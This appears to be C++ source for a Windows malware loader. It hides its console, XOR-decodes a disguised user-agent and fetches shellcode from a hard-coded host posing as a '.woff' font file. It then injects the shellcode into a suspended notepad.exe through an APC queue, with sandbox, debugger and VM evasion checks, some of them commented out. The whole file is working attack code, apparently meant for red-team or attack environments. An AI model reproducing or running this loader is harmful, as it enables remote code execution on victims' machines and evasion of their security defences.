#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include <string>

#pragma comment(lib, "Wininet.lib")

struct Shellcode {
	byte* data;
	DWORD len;
};

std::string DecryptString(const char* encrypted, size_t len) {
	std::string decrypted;
	for (size_t i = 0; i < len; i++) {
		decrypted.push_back(encrypted[i] ^ 0xAA); // XOR decryption with 0xAA - see u_agent.py for how the user-agent is genorated
	}
	return decrypted;
}

const char encUserAgent[] = {
	0xe7, 0xc5, 0xd0, 0xc3, 0xc6, 0xc6, 0xcb, 0x85, 0x9f, 0x84, 0x9a, 0x8a, 0x82, 0xfd, 0xc3, 0xc4, 0xce, 0xc5,
	0xdd, 0xd9, 0x8a, 0xe4, 0xfe, 0x8a, 0x9b, 0x9a, 0x84, 0x9a, 0x91, 0x8a, 0xfd, 0xc3, 0xc4, 0x9c, 0x9e,
	0x91, 0x8a, 0xd2, 0x9c, 0x9e, 0x83, 0x8a, 0xeb, 0xda, 0xda, 0xc6, 0xcf, 0xfd, 0xcf, 0xc8, 0xe1, 0xc3,
	0xde, 0x85, 0x9f, 0x99, 0x9d, 0x84, 0x99, 0x9c, 0x8a, 0x82, 0xe1, 0xe2, 0xfe, 0xe7, 0xe6, 0x86, 0x8a,
	0xc6, 0xc3, 0xc1, 0xcf, 0x8a, 0xed, 0xcf, 0xc9, 0xc1, 0xc5, 0x83, 0x8a, 0xe9, 0xc2, 0xd8, 0xc5, 0xc7,
	0xcf, 0x85, 0x9b, 0x9a, 0x9f, 0x84, 0x9a, 0x84, 0x9a, 0x84, 0x9a, 0x8a, 0xf9, 0xcb, 0xcc, 0xcb, 0xd8,
	0xc3, 0x85, 0x9f, 0x99, 0x9d, 0x84, 0x99, 0x9c
};


Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
	std::string decryptedUserAgent = DecryptString(encUserAgent, sizeof(encUserAgent));

	HINTERNET session = InternetOpen(
		std::wstring(decryptedUserAgent.begin(), decryptedUserAgent.end()).c_str(),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET connection = InternetConnect(
		session,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET request = HttpOpenRequest(
		connection,
		L"GET",
		L"/shellcode.woff", //shellcode endpoint
		NULL,
		NULL,
		NULL,
		0,
		0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0);
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		memcpy(payload + payloadSize, buffer, bytesRead);
        payloadSize += bytesRead;
    }

	byte* newPayload = (byte*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	struct Shellcode out;
	out.data = payload;
	out.len = payloadSize;
	return out;
}

void* CleanVirtualAlloc(SIZE_T size, DWORD allocationType, DWORD protect) {
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	FARPROC NtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	void* baseAddress = NULL;
	((NTSTATUS(WINAPI*)(HANDLE, void**, ULONG_PTR, PSIZE_T, ULONG, ULONG))NtAllocateVirtualMemory)(
		GetCurrentProcess(),
		&baseAddress,
		0,
		&size,
		allocationType,
		protect
		);
	return baseAddress;
}

void InjectShellcode(Shellcode shellcode) {
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	//it may be worth chaning this per machine / attack env to something more reaslistic
	//i may try add this as a compliation argument
	CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	//could be worth adding a not null check for the code below
	void* exec = VirtualAllocEx(pi.hProcess, NULL, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, exec, shellcode.data, shellcode.len, NULL);

	QueueUserAPC((PAPCFUNC)exec, pi.hThread, NULL);
	ResumeThread(pi.hThread);
}

bool IsDebuggerPresentCustom() {
	if (IsDebuggerPresent()) {
		return true;
	}
	HANDLE hProcess = GetCurrentProcess();
	BOOL isDebugger = FALSE;
	CheckRemoteDebuggerPresent(hProcess, &isDebugger);
	return isDebugger;
}

bool IsVirtualMachine() {
	int cpuInfo[4]; 
	__cpuid(cpuInfo, 1); 
	return (cpuInfo[1] >> 31) & 1; 
}

bool IsSandbox() {
	if (GetTickCount64() / 1000 < 600) {
		return true;
	}
	SYSTEM_INFO si;
	GetSystemInfo(&si);
	if (si.dwNumberOfProcessors <= 1) {
		return true;
	}
	return false;
}

void SleepObfuscated() {
	if (IsSandbox()) {
		exit(0);
	}
	for (int i = 0; i < 10; i++) {
		Sleep(rand() % 1000 + 1000);
	}
}

int main() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	//uncomment this for sandbox, VM and debugger detection
	//if (IsDebuggerPresentCustom() || IsVirtualMachine() || IsSandbox()) {
		//exit(0);
	//}

	SleepObfuscated();

	Shellcode shellcode = Download(L"192.168.68.50", 8080);
	InjectShellcode(shellcode);

	free(shellcode.data);

	return 0;
}
